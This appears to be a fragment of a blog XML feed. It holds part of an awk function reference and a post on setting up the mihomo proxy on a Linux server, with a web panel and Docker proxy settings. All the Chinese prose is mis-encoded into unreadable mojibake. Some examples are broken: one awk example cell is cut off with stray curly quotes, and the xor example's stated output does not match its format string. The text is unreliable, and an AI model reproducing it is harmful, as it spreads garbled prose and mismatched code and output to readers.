<td>ä¸€å¹´ä¸­çš„ç¬¬å‡ ä¸ªæ˜ŸæœŸï¼ˆç¬¬ä¸€ä¸ªæ˜ŸæœŸå¤©ä½œä¸ºç¬¬ä¸€å‘¨çš„å¼€å§‹ï¼‰ï¼Œ00-53</td>
</tr>
<tr>
<td>%V</td>
<td>ä¸€å¹´ä¸­çš„ç¬¬å‡ ä¸ªæ˜ŸæœŸï¼ˆç¬¬ä¸€ä¸ªæ˜ŸæœŸä¸€ä½œä¸ºç¬¬ä¸€å‘¨çš„å¼€å§‹ï¼‰ï¼Œ01-53ã€‚</td>
</tr>
<tr>
<td>%w</td>
<td>ä»¥æ•°å­—è¡¨ç¤ºçš„æ˜ŸæœŸï¼ˆ0-6ï¼‰ï¼Œ0è¡¨ç¤ºæ˜ŸæœŸæ—¥ ã€‚</td>
</tr>
<tr>
<td>%W</td>
<td>åè¿›åˆ¶è¡¨ç¤ºçš„ä¸€å¹´ä¸­çš„ç¬¬å‡ ä¸ªæ˜ŸæœŸï¼ˆç¬¬ä¸€ä¸ªæ˜ŸæœŸä¸€ä½œä¸ºç¬¬ä¸€å‘¨çš„å¼€å§‹ï¼‰ï¼Œ00-53ã€‚</td>
</tr>
<tr>
<td>%x</td>
<td>æœ¬åœ°æ—¥æœŸè¡¨ç¤º</td>
</tr>
<tr>
<td>%X</td>
<td>æœ¬åœ°æ—¶é—´è¡¨ç¤º</td>
</tr>
<tr>
<td>%y</td>
<td>å¹´ä»½æ¨¡é™¤ 100ã€‚</td>
</tr>
<tr>
<td>%Y</td>
<td>åè¿›åˆ¶è¡¨ç¤ºçš„å®Œæ•´å¹´ä»½ã€‚</td>
</tr>
<tr>
<td>%z</td>
<td>æ—¶åŒºï¼Œè¡¨ç¤ºæ ¼å¼ä¸º+HHMMï¼ˆä¾‹å¦‚ï¼Œæ ¼å¼è¦æ±‚ç”Ÿæˆçš„ RFC 822æˆ–è€… RFC 1036 æ—¶é—´å¤´ï¼‰</td>
</tr>
<tr>
<td>%Z</td>
<td>æ—¶åŒºåç§°æˆ–ç¼©å†™ï¼Œå¦‚æœæ—¶åŒºå¾…å®šåˆ™æ— è¾“å‡ºã€‚</td>
</tr>
</tbody>
</table>
<h5 id="ä½æ“ä½œå‡½æ•°">ä½æ“ä½œå‡½æ•°</h5>
<table>
<thead>
<tr>
<th><strong>å‡½æ•°å</strong></th>
<th><strong>è¯´æ˜</strong></th>
<th><strong>å®ä¾‹</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>and</td>
<td>ä½ä¸æ“ä½œã€‚</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 num2 = 6 printf &quot;(%d AND %d) = %d\n&quot;, num1, num2, and(num1, num2) &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>(10 AND 6) = 2</code></td>
</tr>
<tr>
<td>compl</td>
<td>æŒ‰ä½æ±‚è¡¥ã€‚</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 printf &quot;compl(%d) = %d\n&quot;, num1, compl(num1) &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>compl(10) = 9007199254740981</code></td>
</tr>
<tr>
<td>lshift</td>
<td>å·¦ç§»ä½æ“ä½œ</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 printf &quot;lshift(%d) by 1 = %d\n&quot;, num1, lshift(num1, 1) &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>lshift(10) by 1 = 20</code></td>
</tr>
<tr>
<td>rshift</td>
<td>å³ç§»ä½æ“ä½œ</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 printf &quot;rshift(%d) by 1 = %d\n&quot;, num1, rshift(num1, 1) &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>rshift(10) by 1 = 5</code></td>
</tr>
<tr>
<td>or</td>
<td>æŒ‰ä½æˆ–æ“ä½œ</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 num2 = 6 printf &quot;(%d OR %d) = %d\n&quot;, num1, num2, or(num1, num2) &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>(10 OR 6) = 14</code></td>
</tr>
<tr>
<td>xor</td>
<td>æŒ‰ä½å¼‚æˆ–æ“ä½œ</td>
<td><code>$ awk 'BEGIN &#123; num1 = 10 num2 = 6 printf &quot;(%d XOR %d) = %d\n&quot;, num1, num2, xor(num1, num2) &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>(10 bitwise xor 6) = 12</code></td>
</tr>
</tbody>
</table>
<h5 id="å…¶ä»–å‡½æ•°">å…¶ä»–å‡½æ•°</h5>
<table>
<thead>
<tr>
<th><strong>å‡½æ•°å</strong></th>
<th><strong>è¯´æ˜</strong></th>
<th><strong>å®ä¾‹</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>close(expr)</td>
<td>å…³é—­ç®¡é“çš„æ–‡ä»¶</td>
<td>`$ awk 'BEGIN { cmd = â€œtr [a-z] [A-Z]â€ print â€œhello, world !!!â€</td>
</tr>
<tr>
<td>delete</td>
<td>ç”¨äºä»æ•°ç»„ä¸­åˆ é™¤å…ƒç´ </td>
<td><code>$ awk 'BEGIN &#123; arr[0] = &quot;One&quot; arr[1] = &quot;Two&quot; arr[2] = &quot;Three&quot; arr[3] =  &quot;Four&quot; print &quot;Array elements before delete operation:&quot; for (i in arr) &#123;  print arr[i] &#125; delete arr[0] delete arr[1] print &quot;Array elements after  delete operation:&quot; for (i in arr) &#123; print arr[i] &#125; &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Array elements before delete operation: One Two Three Four Array elements after delete operation: Three Four</code></td>
</tr>
<tr>
<td>exit</td>
<td>ç»ˆæ­¢è„šæœ¬æ‰§è¡Œï¼Œå®ƒå¯ä»¥æ¥å—å¯é€‰çš„å‚æ•° expr ä¼ é€’ AWK è¿”å›çŠ¶æ€ã€‚</td>
<td><code>$ awk 'BEGIN &#123; print &quot;Hello, World !!!&quot; exit 10 print &quot;AWK never executes this statement.&quot; &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Hello, World !!!</code></td>
</tr>
<tr>
<td>flush</td>
<td>åˆ·æ–°æ‰“å¼€æ–‡ä»¶æˆ–ç®¡é“çš„ç¼“å†²åŒº</td>
<td></td>
</tr>
<tr>
<td>getline</td>
<td>è¯»å…¥ä¸‹ä¸€è¡Œ</td>
<td>ä½¿ç”¨ getline ä»æ–‡ä»¶ marks.txt ä¸­è¯»å…¥ä¸€è¡Œå¹¶è¾“å‡ºï¼š<code>$ awk '&#123;getline; print $0&#125;' marks.txt</code>ï¼ŒAWK ä»æ–‡ä»¶ marks.txt ä¸­è¯»å…¥ä¸€è¡Œå­˜å‚¨åˆ°å˜é‡ 0 ä¸­ã€‚åœ¨ä¸‹ä¸€æ¡è¯­å¥ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ getline è¯»å…¥ä¸‹ä¸€è¡Œã€‚å› æ­¤AWKè¯»å…¥ç¬¬äºŒè¡Œå¹¶å­˜å‚¨åˆ° 0 ä¸­ã€‚æœ€åï¼ŒAWK ä½¿ç”¨ print è¾“å‡ºç¬¬äºŒè¡Œçš„å†…å®¹ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸€ç›´åˆ°æ–‡ä»¶ç»“æŸã€‚</td>
</tr>
<tr>
<td>next</td>
<td>åœæ­¢å¤„ç†å½“å‰è®°å½•ï¼Œå¹¶ä¸”è¿›å…¥åˆ°ä¸‹ä¸€æ¡è®°å½•çš„å¤„ç†è¿‡ç¨‹ã€‚</td>
<td>å½“æ¨¡å¼ä¸²åŒ¹é…æˆåŠŸåç¨‹åºå¹¶ä¸æ‰§è¡Œä»»ä½•æ“ä½œï¼š<code>$ awk '&#123;if ($0 ~/Shyam/) next; print $0&#125;' marks.txt</code></td>
</tr>
<tr>
<td>nextfile</td>
<td>åœæ­¢å¤„ç†å½“å‰æ–‡ä»¶ï¼Œä»ä¸‹ä¸€ä¸ªæ–‡ä»¶ç¬¬ä¸€ä¸ªè®°å½•å¼€å§‹å¤„ç†ã€‚</td>
<td>é¦–å…ˆåˆ›å»ºä¸¤ä¸ªæ–‡ä»¶ã€‚ file1.txt å†…å®¹å¦‚ä¸‹:<code>file1:str1 file1:str2 file1:str3 file1:str4</code>æ–‡ä»¶ file2.txt å†…å®¹å¦‚ä¸‹ï¼š<code>file2:str1 file2:str2 file2:str3 file2:str4</code>ç°åœ¨æˆ‘ä»¬æ¥æµ‹è¯• nextfile å‡½æ•°ã€‚<code>$ awk '&#123; if ($0 ~ /file1:str2/) nextfile; print $0 &#125;' file1.txt file2.txt</code>è¾“å‡ºç»“æœä¸ºï¼š<code>file1:str1 file2:str1 file2:str2 file2:str3 file2:str4</code></td>
</tr>
<tr>
<td>return</td>
<td>ä»ç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°ä¸­è¿”å›å€¼ã€‚è¯·æ³¨æ„ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šè¿”å›å€¼ï¼Œé‚£ä¹ˆçš„è¿”å›å€¼æ˜¯æœªå®šä¹‰çš„ã€‚</td>
<td>åˆ›å»ºæ–‡ä»¶ functions.awkï¼Œå†…å®¹å¦‚ä¸‹ï¼š<code>function addition(num1, num2) &#123; result = num1 + num2 return result &#125; BEGIN &#123; res = addition(10, 20) print &quot;10 + 20 = &quot; res &#125;</code>æ‰§è¡Œè¯¥æ–‡ä»¶ï¼š<code>$ awk -f functions.awk 10 + 20 = 30</code></td>
</tr>
<tr>
<td>system</td>
<td>æ‰§è¡Œç‰¹å®šçš„å‘½ä»¤ç„¶åè¿”å›å…¶é€€å‡ºçŠ¶æ€ã€‚è¿”å›å€¼ä¸º 0 è¡¨ç¤ºå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼›é 0 è¡¨ç¤ºå‘½ä»¤æ‰§è¡Œå¤±è´¥ã€‚</td>
<td><code>$ awk 'BEGIN &#123; ret = system(&quot;date&quot;); print &quot;Return value = &quot; ret &#125;'</code>è¾“å‡ºç»“æœä¸ºï¼š<code>Sun Dec 21 23:16:07 IST 2014 Return value = 0</code></td>
</tr>
</tbody>
</table>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<p><a href="https://blog.csdn.net/Jerry00713/article/details/123867016">linuxä¸‰å‰‘å®¢sedä¹‹æ¨¡å¼ç©ºé—´ä¸ä¿æŒç©ºé—´</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Linuxã€‘mihomoä»£ç†</title>
    <url>/posts/f4ca21fa/</url>
    <content><![CDATA[<h2 id="mihomo">mihomo</h2>
<p>é˜¿é‡Œäº‘æœåŠ¡å™¨æ¯æ¬¡è®¿é—®å¤–ç½‘éƒ½è¶…æ—¶ï¼Œä¹‹å‰å®‰è£…å·¥å…·éƒ½æ˜¯å…ˆä¸‹è½½åˆ°æœ¬åœ°å†ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚å‰äº›å¤©å¤ç°æ¼æ´ä¸‹ä¸ªé•œåƒæ‹–æ¥æ‹–å»çš„ï¼Œå®åœ¨æ˜¯å¿æ— å¯å¿äº†ã€‚ç½‘ä¸Šçœ‹äº†å„ç§æ–‡ç« ï¼Œå°è¯•äº†å„ç§æ–¹æ³•ï¼Œæœ€åä½¿ç”¨äº†mihomoä»£ç†æˆåŠŸè®¿é—®å¤–ç½‘ã€‚</p>
<span id="more"></span>
<h3 id="mihomoå®‰è£…">mihomoå®‰è£…</h3>
<ol>
<li class="lvl-3">
<p>mihomoä¸‹è½½ï¼Œgithubåœ°å€ï¼š<a href="https://github.com/MetaCubeX/mihomo">https://github.com/MetaCubeX/mihomo</a></p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. å› ä¸ºæ²¡æ³•è®¿é—®å¤–ç½‘ï¼Œè¦å…ˆä¸‹è½½åˆ°æœ¬åœ°ï¼Œå†ä¼ åˆ°æœåŠ¡å™¨ã€‚</span><br><span class="line">2. gzip -d mihomo.gz          <span class="comment">#è§£å‹ç¼©</span></span><br><span class="line">3. <span class="built_in">mv</span> mihomo /usr/local/bin/mihomo   <span class="comment">#å°† mihomo ç§»åŠ¨åˆ° /usr/local/bin/ ç›®å½•ï¼š</span></span><br><span class="line">4. <span class="built_in">sudo</span> <span class="built_in">chmod</span> +x /usr/local/bin/mihomo  <span class="comment">#è®¾ç½®å¯æ‰§è¡Œæƒé™</span></span><br></pre></td></tr></table></figure>
<p>ç»è¿‡ä¸Šè¿°æ­¥éª¤ä»¥åï¼Œè¦åœ¨ä¸ºmihomoæ·»åŠ é…ç½®æ–‡ä»¶config.yamlå’ŒCountry.mmdbã€‚Country.mmdbæˆ‘æ˜¯åœ¨åœ¨githubä¸Šæ‰¾çš„ã€‚</p>
<p>2.åˆ›å»º systemd é…ç½®æ–‡ä»¶ <code>/etc/systemd/system/mihomo.service</code>ï¼Œå¹¶æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=mihomo Daemon, Another Clash Kernel.</span><br><span class="line">After=network.target NetworkManager.service systemd-networkd.service iwd.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">LimitNPROC=500</span><br><span class="line">LimitNOFILE=1000000</span><br><span class="line">CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCH CAP_DAC_OVERRIDE</span><br><span class="line">AmbientCapabilities=CAP_NET_ADMIN CAP_NET_RAW CAP_NET_BIND_SERVICE CAP_SYS_TIME CAP_SYS_PTRACE CAP_DAC_READ_SEARCH CAP_DAC_OVERRIDE</span><br><span class="line">Restart=always</span><br><span class="line">ExecStartPre=/usr/bin/sleep 1s</span><br><span class="line">ExecStart=/usr/local/bin/mihomo -d /etc/mihomo</span><br><span class="line">ExecReload=/bin/kill -HUP <span class="variable">$MAINPID</span></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>åˆ›å»ºé…ç½®æ–‡ä»¶ã€‚mihomoå’Œclash metaç”¨çš„æ˜¯ç›¸åŒçš„å†…æ ¸ï¼Œå› æ­¤è¿™ä¸ªé…ç½®æ–‡ä»¶å’Œæˆ‘æœ¬åœ°Windowsç³»ç»Ÿç”¨çš„clash metaæ˜¯ä¸€æ ·çš„ã€‚æˆ‘åˆ›å»ºçš„é…ç½®æ–‡ä»¶åœ¨/etc/mihomo/config.yamlã€‚ä½†æ˜¯è¿™ä¸ªé…ç½®æ–‡ä»¶éœ€è¦æŒ‰ä¸ªæ€§ä¿®æ”¹ï¼Œæˆ‘ä¼šåœ¨åæ–‡ä»‹ç»ä»–çš„æ›´å…¨é¢çš„åŠŸèƒ½ï¼Œéƒ¨åˆ†ç»†èŠ‚å¦‚ä¸‹ï¼š</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[11:42:20 root@rocky95 ~]# <span class="built_in">head</span> -n 20 /etc/mihomo/config.yaml </span><br><span class="line">mixed-port: 7890</span><br><span class="line">allow-lan: <span class="literal">true</span></span><br><span class="line">bind-address: <span class="string">&#x27;*&#x27;</span></span><br><span class="line">mode: rule</span><br><span class="line">log-level: info</span><br><span class="line">external-controller: <span class="string">&#x27;127.0.0.1:9090&#x27;</span></span><br><span class="line">unified-delay: <span class="literal">true</span></span><br><span class="line">tcp-concurrent: <span class="literal">true</span></span><br><span class="line">dns:</span><br><span class="line">........</span><br><span class="line">proxies:</span><br><span class="line">.........</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>é‡å¯systemd</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p>å¯ç”¨ mihomo æœåŠ¡ï¼š</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> mihomo</span><br></pre></td></tr></table></figure>
<h3 id="mihomoä½¿ç”¨">mihomoä½¿ç”¨</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. å¯ç”¨ mihomo æœåŠ¡ï¼š</span><br><span class="line">systemctl <span class="built_in">enable</span> mihomo</span><br><span class="line">2. ç«‹å³å¯åŠ¨ mihomo:</span><br><span class="line">systemctl start mihomo</span><br><span class="line">3. é‡æ–°åŠ è½½mihomo</span><br><span class="line">systemctl reload mihomo</span><br><span class="line">4. æ£€æŸ¥ mihomo çš„è¿è¡ŒçŠ¶å†µ</span><br><span class="line">systemctl status mihomo</span><br><span class="line">5. æ£€æŸ¥ mihomo çš„è¿è¡Œæ—¥å¿—</span><br><span class="line">journalctl -u mihomo -o <span class="built_in">cat</span> -e</span><br><span class="line">æˆ–</span><br><span class="line">journalctl -u mihomo -o <span class="built_in">cat</span> -f</span><br><span class="line">6. å…³é—­ mihomo æœåŠ¡ï¼š</span><br><span class="line">systemctl <span class="built_in">disable</span> mihomo</span><br></pre></td></tr></table></figure>
<h2 id="ä¸ºLinuxè®¾ç½®ä»£ç†">ä¸ºLinuxè®¾ç½®ä»£ç†</h2>
<h3 id="ä¸´æ—¶å¯ç”¨å’Œå…³é—­ä»£ç†">ä¸´æ—¶å¯ç”¨å’Œå…³é—­ä»£ç†</h3>
<p>åœ¨ä½¿ç”¨Linuxæ—¶ï¼Œä¸´æ—¶å¯ç”¨ä»£ç†çš„å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://username:password@ip:port</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://username:password@ip:port</span><br></pre></td></tr></table></figure>
<p>ipå’Œportä¸ºä½ çš„ä»£ç†æœåŠ¡å™¨çš„ipä»¥åŠå¼€æ”¾çš„ç«¯å£ã€‚</p>
<p>å–æ¶ˆä»£ç†ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unset</span> http_proxy</span><br><span class="line"><span class="built_in">unset</span> https_proxy</span><br></pre></td></tr></table></figure>
<h3 id="æ°¸ä¹…å…¨å±€ä»£ç†">æ°¸ä¹…å…¨å±€ä»£ç†</h3>
<p>æ°¸ä¹…å…¨å±€ä»£ç†å°†ä¸´æ—¶å¯ç”¨ä»£ç†çš„å‘½ä»¤æ·»åŠ è‡³ç³»ç»Ÿé…ç½®æ–‡ä»¶ä¸­ï¼Œsourceåˆ·æ–°shellç¯å¢ƒå³å¯ã€‚</p>
<ol>
<li class="lvl-3">
<p>ä¿®æ”¹ç³»ç»Ÿé…ç½®æ–‡ä»¶</p>
</li>
</ol>
<p><code>vim /etc/profile</code> æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://username:password@ip:port</span><br><span class="line"><span class="built_in">export</span> https_proxy=https://username:password@ip:port</span><br></pre></td></tr></table></figure>
<p><code>source /etc/profile</code> æ˜¯é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ</p>
<h3 id="è®¾ç½®ä»£ç†çš„åŸºæœ¬è¯­æ³•">è®¾ç½®ä»£ç†çš„åŸºæœ¬è¯­æ³•</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`ç¯å¢ƒå˜é‡</span><br><span class="line">http_proxy:ä¸ºhttpå˜é‡è®¾ç½®ä»£ç†;é»˜è®¤ä¸å¡«å¼€å¤´ä»¥httpåè®®ä¼ è¾“</span><br><span class="line"><span class="comment"># ç¤ºä¾‹</span></span><br><span class="line">`ä»¥ä¸‹æ˜¯å¸¸è§çš„åŸºæœ¬è¯­æ³•</span><br><span class="line">http_proxy=ip:port</span><br><span class="line">http_proxy=http://ip:port</span><br><span class="line">http_proxy=socks4://ip:port</span><br><span class="line">http_proxy=socks5://ip:port</span><br><span class="line">â€‹</span><br><span class="line">`å¦‚æœä¸æƒ³è®¾ç½®ç™½åå•,ä¹Ÿå¯ä»¥ä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒéªŒè¯</span><br><span class="line">http_proxy=http://username:password@ip:port</span><br><span class="line">http_proxy=http://username:password@ip:port</span><br><span class="line">â€‹</span><br><span class="line">https_proxy:ä¸ºhttpsè®¾ç½®ä»£ç†</span><br><span class="line">ftp_proxy:ä¸ºftpè®¾ç½®ä»£ç†</span><br><span class="line">all_proxy:å…¨éƒ¨å˜é‡è®¾ç½®ä»£ç†,è®¾ç½®äº†è¿™ä¸ªçš„æ—¶å€™ä¸Šé¢ä¸éœ€è¦è®¾ç½®</span><br><span class="line">no_proxy:æ— éœ€ä»£ç†çš„ä¸»æœºæˆ–åŸŸå;å¯ä»¥ä½¿ç”¨é€šé…ç¬¦,å¤šä¸ªæ—¶ä½¿ç”¨<span class="string">&quot;,&quot;</span>å·åˆ†éš”</span><br><span class="line"><span class="comment"># ç¤ºä¾‹ï¼š</span></span><br><span class="line">*.aiezu.com,10.*.*.*,192.168.*.*</span><br><span class="line">*.<span class="built_in">local</span>,localhost,127.0.0.1</span><br></pre></td></tr></table></figure>
<h3 id="éƒ¨ç½²Webæ§åˆ¶é¢æ¿">éƒ¨ç½²Webæ§åˆ¶é¢æ¿</h3>
<p>éƒ¨ç½²å¥½äº†mihomoä»£ç†ä»¥åï¼Œåœ¨è™šæ‹Ÿæœºä¸Šåˆ‡æ¢èŠ‚ç‚¹ã€é‡è½½é…ç½®ç­‰è¾ƒä¸ºä¸ä¾¿ï¼Œå¯ä»¥ä¸ºmihomoéƒ¨ç½²æ§åˆ¶é¢æ¿ï¼Œæ–¹ä¾¿ç®¡ç†ã€‚ä½†å¦‚æœæœåŠ¡å™¨æš´éœ²åœ¨å…¬ç½‘ä¸­ï¼Œä½¿ç”¨Webé¢æ¿ä¼šå¾ˆä¸å®‰å…¨ã€‚å› æ­¤æŠŠWebé¢æ¿è®¾ç½®æˆåªèƒ½æœ¬åœ°å‘å¼€å°±å¯ä»¥äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡SSHåè®®é“¾æ¥æœåŠ¡å™¨å†æ‰“å¼€Webé¢æ¿ã€‚</p>
<ol>
<li class="lvl-3">
<p>åœ¨config.yamlä¸­æ·»åŠ æˆ–ä¿®æ”¹å¦‚ä¸‹é…ç½®ï¼š</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">external-controller: <span class="string">&#x27;127.0.0.1:7891&#x27;</span>#0.0.0.0æ‰€æœ‰ipéƒ½å¯è®¿é—®</span><br><span class="line">secret: <span class="string">&quot;*******&quot;</span>  <span class="comment">#è®¾ç½®å¯†ç æ›´åŠ ä¿é™©</span></span><br><span class="line">external-ui: /etc/mihomo/ui <span class="comment">#webé¡µé¢å­˜æ”¾åœ°å€</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>ä»githubä¸‹è½½</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> git <span class="built_in">clone</span> https://github.com/metacubex/metacubexd.git -b gh-pages /etc/mihomo/ui</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>é‡å¯mihomoæœåŠ¡</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl restart mihomo</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>è¿œç¨‹è¿æ¥è®¿é—®</p>
</li>
</ol>
<figure class="highlight pf"><table><tr><td class="code"><pre><span class="line"><span class="comment">#é¦–å…ˆé€šè¿‡SSHè¿æ¥æˆ‘ä»¬çš„æœåŠ¡å™¨</span></span><br><span class="line">ssh -L <span class="keyword">port</span>:localhost:<span class="keyword">port</span> <span class="keyword">user</span>@ip</span><br><span class="line"><span class="comment">#ç„¶ååœ¨æµè§ˆå™¨æ‰“å¼€ http://localhost:7891/ui/ å°±å¯ä»¥å•¦</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœ<code>external-controller</code>è®¾ç½®æˆ <code>0.0.0.0</code> å°±ç›´æ¥è®¿é—®<a href="http://ip">http://ip</a>:port/uiï¼ˆä¸å»ºè®®ï¼‰</p>
<h2 id="dockerä½¿ç”¨ç½‘ç»œä»£ç†">dockerä½¿ç”¨ç½‘ç»œä»£ç†</h2>
<p>Dockerå®ˆæŠ¤è¿›ç¨‹é»˜è®¤ä¸ä¼šä½¿ç”¨ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­çš„ä»£ç†è®¾ç½®ï¼Œéœ€è¦å•ç‹¬é…ç½®ã€‚</p>
<p>gitbookä¸Šæœ‰ä¸€ç¯‡dockerçš„è¯¦è§£ï¼š<a href="https://yeasy.gitbook.io/docker_practice/">Docker â€” ä»å…¥é—¨åˆ°å®è·µ</a></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ä¸º docker åˆ›å»ºé…ç½®æ–‡ä»¶å¤¹ã€‚</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/systemd/system/docker.service.d</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>ä¸º dockerd åˆ›å»º HTTP/HTTPS ç½‘ç»œä»£ç†çš„é…ç½®æ–‡ä»¶ï¼Œæ–‡ä»¶è·¯å¾„æ˜¯ /etc/systemd/system/docker.service.d/http-proxy.conf ã€‚å¹¶åœ¨è¯¥æ–‡ä»¶ä¸­æ·»åŠ ç›¸å…³ç¯å¢ƒå˜é‡ã€‚</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Environment=<span class="string">&quot;HTTP_PROXY=http://user:password@ip:port/&quot;</span></span><br><span class="line">Environment=<span class="string">&quot;HTTPS_PROXY=http://user:password@ip:port/&quot;</span></span><br><span class="line">Environment=<span class="string">&quot;NO_PROXY=localhost,127.0.0.1,.example.com&quot;</span></span><br></pre></td></tr></table></figure>
<p><font class="notice">æ³¨æ„ï¼šå¦‚æœæ²¡æœ‰å¯†ç å°±ä¸æ·»åŠ  <code>user:password@</code> ï¼ˆå»ºè®®è®¾ç½®å¯†ç ï¼‰</font></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>åˆ·æ–°é…ç½®å¹¶é‡å¯ docker æœåŠ¡ã€‚</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure>
<p><font class="notice">æ³¨æ„ï¼šä½¿ç”¨Â <code>dockerÂ info</code> å¯ä»¥æŸ¥çœ‹dockeré…ç½®ä¿¡æ¯</font></p>
<p>ç»è¿‡æˆ‘ä¸æ–­çš„æµ‹è¯•ï¼Œæˆ‘æœ¬åœ°çš„ç”µè„‘æ€»æ˜¯ä¼šå‡ºç°æ— æ³•ä½¿ç”¨æœåŠ¡å™¨çš„ä»£ç†è®¿é—®å¤–ç½‘çš„æƒ…å†µï¼Œé€šå¸¸éœ€è¦æˆ‘è¿›å…¥Webæ§åˆ¶é¡µé¢æ¢å‡ ä¸ªä»£ç†æ‰å¯ä»¥ã€‚è¿™æ ·ä¸€æ¥éå¸¸çš„éº»çƒ¦ï¼Œå› æ­¤æˆ‘æ”¾å¼ƒäº†è¿™ä¹ˆæ“ä½œã€‚ä¸ºäº†æ–¹ä¾¿ï¼Œå½“æˆ‘çš„æœ¬åœ°æœºå™¨ï¼ˆè™šæ‹Ÿæœºï¼‰éœ€è¦ä½¿ç”¨ä»£ç†æ—¶ï¼Œç›´æ¥ä½¿ç”¨æˆ‘ä¸»æœºçš„ä»£ç†ã€‚è€Œä¸ºäº†äº‘æœåŠ¡å™¨çš„å®‰å…¨ï¼Œç›´æ¥å°†äº‘æœåŠ¡å™¨çš„ä»£ç†å¯¹å¤–å…³é—­äº†ã€‚</p>
<h2 id="å®¢æˆ·ç«¯ä½¿ç”¨ä»£ç†">å®¢æˆ·ç«¯ä½¿ç”¨ä»£ç†</h2>
<p>å› ä¸ºä»£ç†æ˜¯éƒ¨ç½²åœ¨æœåŠ¡å™¨çš„ï¼Œå› æ­¤è‡ªå·±çš„æ‰‹æœºã€ç”µè„‘ã€å¹³æ¿ç­‰ä¹Ÿå¯ä»¥ä½¿ç”¨æœåŠ¡å™¨çš„ä»£ç†ã€‚ä¿®æ”¹é…ç½®æ–‡ä»¶allow-lanæ”¹ä¸ºtrueå³å¯ï¼ˆå±é™©ï¼‰ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">allow-lan: <span class="literal">true</span></span><br><span class="line">authentication:</span><br><span class="line">  - <span class="string">&quot;user:password&quot;</span>   <span class="comment"># æ ¼å¼ï¼šç”¨æˆ·å:å¯†ç ï¼ˆå¯é…ç½®å¤šç»„ï¼‰</span></span><br></pre></td></tr></table></figure>
